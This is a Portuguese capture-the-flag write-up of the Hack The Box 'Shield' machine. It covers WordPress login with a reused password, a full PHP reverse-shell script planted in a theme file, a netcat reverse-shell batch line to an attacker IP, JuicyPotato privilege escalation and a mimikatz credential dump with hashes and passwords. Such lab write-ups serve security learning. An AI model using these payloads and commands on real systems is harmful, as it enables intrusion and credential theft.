---
title: HTB Shield Writeup
author: Hastur
date: 2021-09-06 22:00:00 -0300
categories: [Writeups, Hack The Box]
tags: [HTB, Starting point, Windows, Very Easy, Web, WordPress, Juice Potato, Mimikatz, PHP]
image: /img/htb/htb-shield-logo.png
alt: "HTB Shield Writeup"
---

<img src="/img/htb/htb-shield-logo.png">

<br>


| Nome | Shield      |
|------|-------------|
|IP    | 10.10.10.29 |
|Pontos| 0           |
|OS    | Windows     |
|Nível | Very Easy   |

<br>

## RECON

### Nmap
```bash
┌──(hastur㉿hastur)-[~/Shield]
└─$ sudo nmap -v -p- -sCV -O -Pn 10.10.10.29 --min-rate=512
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3306/tcp open  mysql   MySQL (unauthorized)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012|10 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_10:1607
Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.218 days (since Mon Sep  6 17:32:55 2021)
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Desta vez sabemos que há grandes chances de estarmos lidando com o Windows Server 2016 e encontramos somente as portas 80 e 3306 abertas. Vamos começar pela porta 80.

### Porta 80

<img src="/img/htb/htb-shield-1.png">

Nos deparamos com a página padrão do IIS HTTPD, o que nos dá uma boa informação. Mas precisamos de algo mais, vamos fazer uma varredura de diretórios com `gobuster`.

```bash
┌──(hastur㉿hastur)-[~/Shield]
└─$ gobuster dir -e -u http://10.10.10.29/ -w /usr/share/wordlists/dirb/common.txt -r
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.29/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Follow Redirect:         true
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/09/06 22:51:06 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.10.29/wordpress            (Status: 200) [Size: 24088]
                                                                   
===============================================================
2021/09/06 22:52:39 Finished
===============================================================
```
A varredura nos trouxe o diretório `/wordpress`, o que é uma informação muito valiosa.

<img src="/img/htb/htb-shield-2.png">

O Wordpress é um CMS (Content Management System) que permite a rápida criação de sites e blogs.

Por padrão, o usuário precisa se autenticar no CMS e configurar e editar todo o blog/site. Sua página de autentucação, por padrão fica em `wp-login.php`, vamos verificar se esta página está com as configurações padrão, acessando [http://10.10.10.29/wordpress/wp-login.php](http://10.10.10.29/wordpress/wp-login.php).

<img src="/img/htb/htb-shield-3.png">

Neste ponto, temos várias credenciais das máquinas anteriores do `Starting Point`, tentando com algumas delas, conseguimos acesso com `admin:P@s5w0rd!`, a senha da ultima máquina [Vaccine](https://hastur666.github.io/posts/htb-vaccine-writeup/).

<img src="/img/htb/htb-shield-4.png">

O Wordpress também roda em PHP, o que nos dá brecha para tentarmos um acesso remoto editando alguma página com um payload.

No menu à direita, temos as opções de edição, se clicarmos em `Appearance > Theme Editor`, podemos fazer alterações nos códigos de páginas.

Se selecionarmos o tema `GutenBooster`, podemos editar o código fonte da página `404.php`.

<img src="/img/htb/htb-shield-5.png">

Ao editar a página, podemos inserir um payload de conexão reversa, no meu caso utilizarei o seguinte:

```php
<?php
// Copyright (c) 2020 Ivan Šincek
// v2.4
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = '/bin/sh';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from {$name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to {$name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: {$status['pid']}\n");
                    do {
                        $status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.10.15.185', 8443);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';

```
<img src="/img/htb/htb-shield-6.png">

Ao clicar em `Update File`, nós salvamos a alteração. Precisamos setar um `netcat`, na porta escolhida, no meu caso 8443 e em seguida fazer um curl para o endereço da página `404.php`.

Por padrão, o Wordpress salva seus recursos de tema em `wp-content/<nome do tema>/404.php`.

```bash
┌──(hastur㉿hastur)-[~/Shield]
└─$ curl 10.10.10.29/wordpress/wp-content/themes/gutenbooster/404.php
```

E conseguimos o shell.

<img src="/img/htb/htb-shield-7.png">

Esta máquina também não possui a flag de usuário, portanto, precisamos efetuar a escalação de privilégios.

## Escalação de privilégios

Ao efetuar a enumeração local, descobrimos que estamos logados com o usuário `iis apppool\wordpress` e o sistema tem a arquitetura `x64`.

```cmd
C:\inetpub\wwwroot\wordpress\wp-content\themes\gutenbooster>whoami
iis apppool\wordpress

C:\inetpub\wwwroot\wordpress\wp-content\themes\gutenbooster>systeminfo

Host Name:                 SHIELD
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00376-30000-00299-AA303
Original Install Date:     2/4/2020, 12:58:01 PM
System Boot Time:          9/6/2021, 8:35:40 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 976 MB
Virtual Memory: Max Size:  2,431 MB
Virtual Memory: Available: 1,253 MB
Virtual Memory: In Use:    1,178 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    MEGACORP.LOCAL
Logon Server:              N/A
Hotfix(s):                 4 Hotfix(s) Installed.
                           [01]: KB3199986
                           [02]: KB4520724
                           [03]: KB4524244
                           [04]: KB4537764
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.29
                                 [02]: fe80::6c58:513d:ce98:635d
                                 [03]: dead:beef::6c58:513d:ce98:635d
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

C:\inetpub\wwwroot\wordpress\wp-content\themes\gutenbooster
```
O Windows Server 2016, assim como algumas outras versões, se não tiver o patch de correção, pode ser vulnerável às vulnerabilidades `Potatoes`, no caso da versão 2016, é o `Juice Potato`.

Esta vunerabilidade permite a escalção de privilégios. Mais informações sobre as vulnerabilidades [aqui](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html).

Após baixar o binário do repositório citado acima, precisamos fazer upload para o servidor, para isso vamos iniciar um server HTTP com python3 e utilizar o comando `certutil do windows`.

```bash
┌──(hastur㉿hastur)-[~/Shield]
└─$ mv JuicyPotato.exe jp.exe
                                                                                                                     
┌──(hastur㉿hastur)-[~/Shield]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Porém, só conseguimos fazer upload em um diretório em que o usuário tenha permissão de escrita, normalmente o usuário do webserver tem permissões de escrita no diretório `/wp-content/uploads`, vamos navegar até lá.

<img src="/img/htb/htb-shield-8.png">

Agora podemos requisitar para nosso HTTP server.

<img src="/img/htb/htb-shield-9.png">

Com o exploit no alvo, precisamos de uma forma de executá-lo e obter acesso administrativo.

Mas antes, precisamos entender como o exploit funciona.

Basiamente ele executa um programa ou executável com privilégios administrativos, podemos executar qualquer programa já existente no Windows, ou criar nosso próprio script `.bat` e obter uma conexão reversa.

Poém, para obter a conexão reversa, precisamos de algum executável que possa fazer esta função. A própria distribuição Kali Linux, tem alguns executáveis Windows que podemos aproveitar, inclusive o `netcat`.

No diretório `/usr/share/windows-binaries/` encontramos o `nc.exe`, que podemos copiar para o nosso diretório atual e subir para nosso alvo da mesma forma que subimos o exploit.

<img src="/img/htb/htb-shield-10.png">

Com o netcat na máquina alvo, podemos usar o próprio `echo` do Windows para criarmos um script `reverse.bat` com o comando para nos enviar um Power Shell com o netcat.

```cmd
C:\inetpub\wwwroot\wordpress\wp-content\uploads>echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.15.185 8444 > reverse.bat  
```
<img src="/img/htb/htb-shield-11.png">

Com tuddo pronto, podemos setar um netcat para ouvir na porta 8444, que foi a utilizada em nosso script e enviar o comando para o exploit.

```cmd
C:\inetpub\wwwroot\wordpress\wp-content\uploads>jp.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\reverse.bat -l 1337
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

O exploit executou nosso script e nos deu um reverse shell com privilégios administrativos!!!

<img src="/img/htb/htb-shield-12.png">

A flag `root.txt` se encontra no Desktop do Administrator.

## Pós exploração

Ainda podemos checar a possibilidade de obter senhas de outros usuários do Windows Server, e como sabemos que no `Starting Point` senhas são valiosas, não custa tentar.

Na própria distribuição Kali Linux, no diretório `/usr/share/windows-resources/`, encontramos mais executáveis, entre eles o `mimikatz.exe`, podemos copiar a versão de 64 bits para nosso diretório atual e subir para o alvo da mesma forma que fizemos antes.

<img src="/img/htb/htb-shield-13.png">

Agora em nosso shell administrativo, podemos executá-lo.

<img src="/img/htb/htb-shield-14.png">

Com o comando `sekurlsa::logonpasswords`, obtemos o dump de todos as senhas em cache.

```cmd

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 66298 (00000000:000102fa)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/7/2021 5:14:07 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : SHIELD$
         * Domain   : MEGACORP
         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
        tspkg :
        wdigest :
         * Username : SHIELD$
         * Domain   : MEGACORP
         * Password : (null)
        kerberos :
         * Username : SHIELD$
         * Domain   : MEGACORP.LOCAL
         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SHIELD$
Domain            : MEGACORP
Logon Server      : (null)
Logon Time        : 9/7/2021 5:14:07 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : SHIELD$
         * Domain   : MEGACORP
         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
        tspkg :
        wdigest :
         * Username : SHIELD$
         * Domain   : MEGACORP
         * Password : (null)
        kerberos :
         * Username : shield$
         * Domain   : MEGACORP.LOCAL
         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
        ssp :
        credman :

Authentication Id : 0 ; 36467 (00000000:00008e73)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 9/7/2021 5:14:07 PM
SID               : 
        msv :
         [00000003] Primary
         * Username : SHIELD$
         * Domain   : MEGACORP
         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 308037 (00000000:0004b345)
Session           : Interactive from 1
User Name         : sandra
Domain            : MEGACORP
Logon Server      : PATHFINDER
Logon Time        : 9/7/2021 5:15:25 PM
SID               : S-1-5-21-1035856440-4137329016-3276773158-1105
        msv :
         [00000003] Primary
         * Username : sandra
         * Domain   : MEGACORP
         * NTLM     : 29ab86c5c4d2aab957763e5c1720486d
         * SHA1     : 8bd0ccc2a23892a74dfbbbb57f0faa9721562a38
         * DPAPI    : f4c73b3f07c4f309ebf086644254bcbc
        tspkg :
        wdigest :
         * Username : sandra
         * Domain   : MEGACORP
         * Password : (null)
        kerberos :
         * Username : sandra
         * Domain   : MEGACORP.LOCAL
         * Password : Password1234!
        ssp :
        credman :

Authentication Id : 0 ; 167946 (00000000:0002900a)
Session           : Service from 0
User Name         : wordpress
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 9/7/2021 5:14:32 PM
SID               : S-1-5-82-698136220-2753279940-1413493927-70316276-1736946139
        msv :
         [00000003] Primary
         * Username : SHIELD$
         * Domain   : MEGACORP
         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
        tspkg :
        wdigest :
         * Username : SHIELD$
         * Domain   : MEGACORP
         * Password : (null)
        kerberos :
         * Username : SHIELD$
         * Domain   : MEGACORP.LOCAL
         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
        ssp :
        credman :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 9/7/2021 5:14:11 PM
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 9/7/2021 5:14:08 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 66277 (00000000:000102e5)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/7/2021 5:14:07 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : SHIELD$
         * Domain   : MEGACORP
         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
        tspkg :
        wdigest :
         * Username : SHIELD$
         * Domain   : MEGACORP
         * Password : (null)
        kerberos :
         * Username : SHIELD$
         * Domain   : MEGACORP.LOCAL
         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SHIELD$
Domain            : MEGACORP
Logon Server      : (null)
Logon Time        : 9/7/2021 5:14:07 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : SHIELD$
         * Domain   : MEGACORP
         * Password : (null)
        kerberos :
         * Username : shield$
         * Domain   : MEGACORP.LOCAL
         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
        ssp :
        credman :

mimikatz # 
```
E entre os dados do dump, conseguimos as seguintes credenciais:

```cmd
        kerberos :
         * Username : sandra
         * Domain   : MEGACORP.LOCAL
         * Password : Password1234!
```

<br>

E comprometemos o server!!
<br>

<img src="/img/htb/hackerman.gif">
<br>
### Referências

| Vulnerabilidade                           | Url                                                                                                             |
|-------------------------------------------|-----------------------------------------------------------------------------------------------------------------|
| Juicy Potato| [https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#juicyPotato](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#juicyPotato)|


